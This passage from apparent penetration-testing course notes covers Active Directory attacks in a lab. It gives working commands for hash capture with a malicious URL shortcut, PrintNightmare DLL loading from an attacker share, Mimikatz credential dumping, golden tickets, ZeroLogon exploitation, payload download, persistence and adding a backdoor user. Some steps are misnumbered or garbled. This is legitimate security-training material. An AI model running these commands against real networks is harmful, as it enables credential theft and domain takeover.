</code></pre><h3 id="78d269d0-481e-44ad-b42b-58c11df2697c" class=""><strong>tips</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#tips"></a></strong></h3><p id="4a4f7cea-16eb-4f9e-acd6-fa5b87c8b554" class="">in smb:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a62ca64c-ddb5-49a5-afa9-7bf030e322e6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">prompt off
recurse on
mget *

in Wserver2012&lt; -Found Groups.xml
Get the cpassword
gpp-decrypt &lt;cpassword&gt;
</code></pre><h3 id="44560479-7c7f-4f74-aaa7-927f9f90a610" class=""><strong>URL File Attacks</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#url-file-attacks"></a></strong></h3><ul id="4f1a78ad-bf10-440f-bc4a-4a9bd9490c86" class="bulleted-list"><li style="list-style-type:disc">name it with ‘@something.url’</li></ul><ul id="c9c807f8-d312-48e8-9005-5a6b93dbaa8c" class="bulleted-list"><li style="list-style-type:disc">and place it in a share folder, or whatever place to people to click and redirect to our machine</li></ul><ul id="eb106c0d-5815-4e26-9ce8-97a1b36f282e" class="bulleted-list"><li style="list-style-type:disc">so we can grab with responder</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a53a36e0-2d15-44d4-a002-4ddb4938d4e8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\&lt;kali ip&gt;\%USERNAME%.icon
IconIndex=1

# Getting Hash
responder -I eth0 -v
</code></pre><blockquote id="faef1b0c-355a-4a57-9754-2357ae16196f" class="">you dont even need to open the file, just go to the directory of the file and we have access from responder</blockquote><h3 id="f2d1ac93-097b-4e0e-a7be-1c39d9cd1cbc" class=""><strong>PrintNightmare (CVE-2021-1675)</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#printnightmare-cve-2021-1675"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="944c4423-60f8-44a6-ac88-75733c2112c3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://github.com/cube0x0/CVE-2021-1675
https://github.com/calebstewart/CVE-2021-1675
</code></pre><p id="b794cee0-e22a-46f0-a27c-a9efb953761b" class="">To test if its vulnerable:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="dfe506fa-b929-4ce7-b236-9194a4bdb9df" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">run rpcdump.py @&lt;dc ip&gt; | egrep &#x27;MS-RPRN|MSPAR&#x27;
</code></pre><ul id="a637cef8-96bc-4489-8163-0d39b5019bcf" class="bulleted-list"><li style="list-style-type:disc">Install the last version of impacket</li></ul><ul id="2074fcfb-d719-4dc4-8e8d-f3de02037132" class="bulleted-list"><li style="list-style-type:disc">grab the code and save in somethin.py</li></ul><h3 id="283067b8-e624-4eea-b8f2-74d580bb7ca1" class=""><strong>The Attack</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#the-attack"></a></strong></h3><p id="790cae03-e498-491c-be54-749be4ea9063" class=""><strong>Step 1</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1efff05a-8a9c-4f3c-9483-91d988a852bd" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">set mfvenom -o shell.dll
</code></pre><p id="960f1a6c-11d0-4ba1-abd8-d531b0af804d" class=""><strong>Step 5</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ef78d63f-a804-4ae3-a1a6-0f6799b1da69" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">set msfconsole
</code></pre><p id="b88797a6-226f-4475-b545-c2f1e56b362f" class=""><strong>Step 3</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d98b766-0132-4335-a063-88b663deebf6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">smbserver.py share &#x27;pwd&#x27; -smb2support
</code></pre><p id="e4be5c90-b26a-42d3-b29a-4bd76010b5a6" class=""><strong>Step 4</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="92d63157-821b-4a3f-82ea-f02d35cb7eff" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Example:
./CVE-2021-1675.py hackit.local/domain_user:Pass123@&lt;dc ip&gt; &#x27;\\&lt;kali ip&gt;\share\shell.dll&#x27;
./CVE-2021-1675.py hackit.local/domain_user:Pass123@&lt;dc ip&gt;  &#x27;C:\shell.dll&#x27;
</code></pre><h3 id="3b2922b9-ad5e-4418-9744-1c7131976880" class=""><strong>Mitigation</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#mitigation-1"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2e9ed584-7f7f-46be-827f-cc257cb1ab30" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Disable Spooler service
</code></pre><h3 id="72818557-2823-4c3f-be7d-ea1373868e58" class=""><strong>Mimikatz</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#mimikatz"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="dbbbe061-2ebb-47fd-8e67-0036c68d5e8c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Tools used to view and steal credentials, generate kerberos tickets and leverage attacks
- dumps credentials stored in memory
- just a few attacks:
- credential dumping, pass-the-hash, over-pass-the-hash, pass-the-ticket, golden ticket, silver ticket
</code></pre><p id="233de7b9-56d5-4b7e-a8d5-add92bd7406c" class="">→ https://github.com/gentilkiwi/mimikatz</p><p id="43cc55e2-ff39-463e-aaa0-5ec6339d6ece" class="">Run in the DC:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0dd39ba7-23df-4eae-8a46-9786a3d5b2f5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam /patch
lsadump::lsa /patch = lsa (local security authority)
# ntds.dit = contains all the credentials aswell
</code></pre><h3 id="eff906a4-828c-4ba3-b3aa-e6abefadf804" class=""><strong>Golden ticket</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#golden-ticket"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="65b3de7a-15b2-4b22-84c3-2885061f099f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt

# in the output:
# grab the SID of the domain
# grab the NTLM hash of the TGT account

kerberos::golden /User:Administrator /domain:mk.local /sid:&lt;SID&gt; /krbtgt:&lt;NTLM hash&gt; /id:500 /ptt
# ptt = pass the ticket

misc::cmd = to get a shell
</code></pre><blockquote id="ec2114a4-1b21-4fe0-900d-f727dcdbedb8" class="">after that we can psexec.exe and dominate all the DC network</blockquote><h3 id="5edffd4a-40b3-489c-a246-8e271bf7ce9f" class=""><strong>ZeroLogon (CVE-2020-1472)</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#zerologon-cve-2020-1472"></a></strong></h3><p id="cd255614-75df-4406-a19c-e4e5a84a450c" class="">→ https://github.com/dirkjanm/CVE-2020-1472</p><p id="95933da4-3f94-4d0d-885e-8037439a378c" class="">→ https://github.com/SecuraBV/CVE-2020-1472</p><h3 id="8295eb99-4e49-4de9-8d85-4f45b00fc993" class=""><strong>Checker</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#checker"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="541e56d5-37fe-459a-a40a-2df82f4a8aa3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python3 zerologon_check.py &lt;domain controller&gt; &lt;target ip&gt;
</code></pre><p id="f3d6ab1b-78ae-4ec2-bd7c-aee1cda6d2e7" class="">If it shows -&gt; Success DC can be fully compromised by a ZeroLogon</p><blockquote id="b6d8da19-e7f1-447b-a20c-d1797945685c" class="">we can print and show to the client, without the need to execute the exploit. Cause sets the credentials of DC to NULL, so we need to restore after, not worth the risk</blockquote><h3 id="d4861ce2-b328-40a6-903b-aaff7be9542c" class=""><strong>Attack</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#attack"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0bea12cb-0b14-4ebb-8cbb-ee899e58c776" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python3 cve-2020-1472-exploit.py &lt;domain controller&gt; &lt;target ip&gt;
secretsdump.py -just-dc &lt;domain/DC\$@IP&gt;
</code></pre><h3 id="6a639408-7bfd-43a7-a086-5dbc426f9178" class=""><strong>Restore</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#restore"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b7aafe70-a58a-44f7-9758-a5b640bc5b4d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">secretsdump.py administrator@&lt;target ip&gt; -hash &lt;administrator full hash&gt;
found the plain_password_hex &gt; copy the hash that is in front
python3 restorepassword.py &lt;domain/DC@DC&gt; -target-ip &lt;ip&gt; -hexpass &lt;paste the hash of plain_pwd_hex&gt;
</code></pre><h1 id="c691d548-fa87-4471-ab75-17119985f13a" class=""><strong>Post Exploitation</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#post-exploitation"></a></strong></h1><h2 id="7d317e13-45b7-488f-a2e8-7fa18a13e63f" class=""><strong>File Transfer Review</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#file-transfer-review"></a></strong></h2><p id="de5c6644-a5c4-4fab-9719-81e4791a6770" class="">Certutil:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e6c2b099-dad7-421e-bc4f-5cb613d7a0d5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">certutil.exe -urlcache -f http://&lt;ip&gt;/file.txt output_file.txt
</code></pre><p id="14d22a54-ace7-4a42-9ff1-cba48e108747" class="">HTTP:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4800dc17-c0a8-4a1c-92b6-330436aa0e3f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python3 -m http.server
python -m SimpleHTTPServer
</code></pre><p id="01362e1e-f35d-4f8e-b326-93a46289e0c5" class="">Browser:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0c69d8de-9b95-4868-bdb9-d91b239030d0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Navigate directly to file
</code></pre><p id="7a84b8e6-81bc-4509-be87-84bae23926e9" class="">FTP:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d80b08af-79a8-45fe-8a6e-878ac3bdde9e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python -m pyftpdlib 21 &lt;kali ip&gt;
ftp &lt;kali ip&gt;
</code></pre><p id="b816ea92-858c-46fc-b9a2-91897ae429a7" class="">Linux:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23ec8d85-14e2-4362-8555-253456b85cd4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">wget http://&lt;ip&gt;:&lt;port&gt;/file
</code></pre><p id="8bb794c9-c085-4995-bd48-742f2d04f956" class="">Metasploit:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="94fc7408-0cb9-4680-8c6c-e973d68708e1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Has download and upload features to transfer files
</code></pre><h2 id="d37b1b41-3916-4675-a222-6bb2a15e3b17" class=""><strong>Maintaining Access</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#maintaining-access"></a></strong></h2><h3 id="214df5ad-9451-4066-851f-4bf66dd0dff2" class=""><strong>With Metasploit</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#with-metasploit"></a></strong></h3><p id="0603a1cf-52a3-4a55-9b3d-531a6e3d8666" class="">Persistence Scripts:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="80549bd9-6e5e-487c-8bf1-a6cdd1e5738d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">run persistence -h
exploit/windows/local/persistence
exploit/windows/local/registry_persistence
</code></pre><p id="c30cdaa5-1eb9-4170-8eea-59175710e578" class="">Scheduled Tasks:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b59aad6f-937f-4d09-9a65-04215ddf8d6b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">run scheduleme
run schtaskabuse
</code></pre><p id="31359d4c-2fe6-4ed6-afe5-55cee5b77079" class="">Add a User:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bf65970f-9a1a-4c52-81c6-9b4c60a64e38" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">net user hacker password123 /add
</code></pre><h3 id="8a41dc8f-1966-4d3a-8c0b-afb1bc9e62d2" class=""><strong>Pivoting</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#pivoting"></a></strong></h3><p id="ff883c1b-c4ef-4e9a-9c92-5819a517a433" class="">Lab setup:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4fd90fd6-3c5d-46eb-8cd4-fb516f25b29a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Shutdown the w10 machines
- go to virtual network editor em vmware
- change settings &gt; add network &gt; set up a range like 10.10.10.0/24
- edit virtual machine settings &gt; add a network adapter &gt; put the new network in the second adapter
- in the 2nd w10 machine &gt; just change the net adapter to the new network
